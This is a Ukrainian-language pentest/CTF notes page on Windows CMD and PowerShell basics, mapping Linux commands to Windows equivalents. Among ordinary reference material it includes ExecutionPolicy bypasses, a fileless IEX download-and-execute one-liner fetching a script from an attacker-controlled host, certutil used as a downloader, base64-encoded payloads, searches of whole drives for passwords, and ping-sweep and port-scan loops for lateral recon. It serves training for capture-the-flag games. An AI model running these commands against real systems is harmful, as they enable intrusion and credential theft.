# Windows: CMD & PowerShell (практичні основи)

**Навіщо:** на Linux-рефлексах Windows-shell гальмує. Тут — переклад «як це зробити» для CMD і PowerShell: файли, процеси, сервіси, мережа, пошук, автоматизація. Не довідник мови, а те, що реально набираєш у shell.
**Коли:** отримано `cmd`/PowerShell і бракує синтаксису.
← [README](README.md) · [enumeration](01-enumeration.md) · [cheatsheet](cheatsheet.md)

---

## CMD vs PowerShell — що обирати
- **cmd** — скрізь, навіть у найменших контекстах (webshell, обмежений RCE). Коротко, без залежностей.
- **PowerShell (PS)** — потужніший пошук/фільтри/об'єкти, робота з реєстром/WMI/мережею, автоматизація. Запуск з cmd: `powershell -nop -ep bypass -c "<...>"`.
- Перейти в PS із cmd: `powershell`. Перевірити, де ти: `(dir 2>&1 *`) — якщо `$PSVersionTable` працює → це PS.

## Еквіваленти Linux → Windows (швидкий переклад)
| Задача | CMD | PowerShell |
|---|---|---|
| список файлів | `dir /a` | `Get-ChildItem -Force` / `ls` |
| рекурсивно | `dir /s /b` | `Get-ChildItem -Recurse` |
| вміст файлу | `type f` | `Get-Content f` / `cat f` |
| grep | `findstr /i слово f` | `Select-String -Pattern 'слово' f` |
| find файл | `dir /s /b C:\*flag*` | `gci C:\ -Recurse -Filter *flag* -EA 0` |
| which | `where python` | `Get-Command python` |
| процеси | `tasklist` | `Get-Process` |
| вбити | `taskkill /PID n /F` | `Stop-Process -Id n` |
| env | `set` | `Get-ChildItem Env:` / `$env:USER` |
| curl/wget | `certutil -urlcache -f URL out` | `iwr URL -OutFile out` |
| cat\|head | `type f` | `gc f -TotalCount 20` |
| wc -l | `find /c /v "" f` | `(gc f).Count` |

## Робота з файлами / пошук (детальніше)
```cmd
:: пошук за вмістом у дереві
findstr /s /i /m "password" C:\*.config C:\*.txt C:\*.ini
:: пошук за іменем
dir /s /b C:\ | findstr /i "flag cred secret"
```
```powershell
# пошук за вмістом (regex), ігнорувати помилки доступу
Get-ChildItem C:\ -Recurse -Include *.txt,*.config,*.xml,*.ini -EA SilentlyContinue |
  Select-String -Pattern 'password|secret|flag' -EA SilentlyContinue
# розмір/дата (нові файли — цікаві під час гри)
gci C:\Users -Recurse -EA 0 | ? LastWriteTime -gt (Get-Date).AddHours(-12) | Select FullName,LastWriteTime
```

## Процеси / сервіси / мережа
```powershell
Get-Process | Sort CPU -Desc | Select -First 10
Get-Service | ? Status -eq Running | Select Name,DisplayName
Get-NetTCPConnection -State Listen | Select LocalAddress,LocalPort,OwningProcess
Get-CimInstance Win32_Service | Select Name,StartName,PathName,State   # для privesc
Restart-Service <name>   # лише якщо прав вистачає і це безпечно (правила: сервіс не ламати)
```
```cmd
sc query <name>        &  sc qc <name>          :: стан і конфіг сервісу
net start <name>       &  net stop <name>        :: керування (обережно — правила)
```

## ExecutionPolicy — її реальне значення
- ExecutionPolicy **не є механізмом безпеки** — це захист від випадкового запуску `.ps1`, а не від атакуючого. Обходиться тривіально:
```powershell
powershell -ep bypass -f script.ps1
powershell -ep bypass -c "IEX(Get-Content .\script.ps1 -Raw)"
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.8.N.x:8000/s.ps1')"  # fileless, з пам'яті
Get-Content .\script.ps1 | powershell -noprofile -        # через stdin
```
> **Практичний сенс:** «script cannot be loaded because running scripts is disabled» — це НЕ стоп. Додай `-ep bypass` або виконай через `IEX`. Жоден із цих обходів не потребує адмін-прав.

## AMSI / логування (коротко, без обходів-малварі)
- Сучасний PS має **AMSI** (сканує вміст) і **ScriptBlock Logging** (пише в Event Log). Для CTF-команд це зазвичай не заважає, але знай: твої PS-команди можуть лишати слід у логах (`Microsoft-Windows-PowerShell/Operational`) — релевантно для «аналізу чужої активності» ([forensics](07-forensics-logs.md)), не для обходу.

## Базова автоматизація (коли корисно під час гри)
```powershell
# прогнати enum-команди й зберегти
'whoami /all','systeminfo','net user','ipconfig /all' | % { "=== $_ ==="; cmd /c $_ } *> loot.txt

# перебрати хости для перевірки живих (lateral recon зсередини)
1..254 | % { $ip="10.10.10.$_"; if(Test-Connection $ip -Count 1 -Quiet){ "up $ip" } }

# перевірити порт на наборі хостів
$h='10.10.10.5'; 1..1024 | % { if((Test-NetConnection $h -Port $_ -WarningAction 0).TcpTestSucceeded){"open $_"} }

# знайти .config з паролями по всьому диску
gci C:\ -Recurse -Include *.config,*.xml,*.ini -EA 0 |
  Select-String 'password|connectionString' -EA 0 | Select Path,Line -Unique
```
```cmd
:: прогнати список команд у cmd-циклі
for %c in (whoami hostname) do @echo === %c === & %c
```

## Обмеження / пастки
- У **webshell/обмеженому RCE** PS може бути недоступний або без інтерактиву → лишайся в cmd, уникай команд, що чекають вводу.
- `certutil -urlcache` інколи лишає кеш — для чистоти: `certutil -urlcache -f -split <url>` або прибрати кеш. Для гри некритично.
- Лапки/`&`/`|` у cmd і PS екрануються по-різному — для складного пейлоаду зручніше base64: `powershell -enc <base64-UTF16LE>`.
  ```bash
  # згенерувати на Kali:
  echo -n 'IEX(...)' | iconv -t UTF-16LE | base64 -w0
  ```

## Джерела
- HackTricks — Basic CMD/PowerShell for pentesters: https://book.hacktricks.wiki/en/windows-hardening/basic-cmd-for-pentesters.html
- Microsoft — about_Execution_Policies: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies
- Microsoft — PowerShell docs: https://learn.microsoft.com/en-us/powershell/
- LOLBAS (certutil та ін. як downloader): https://lolbas-project.github.io/
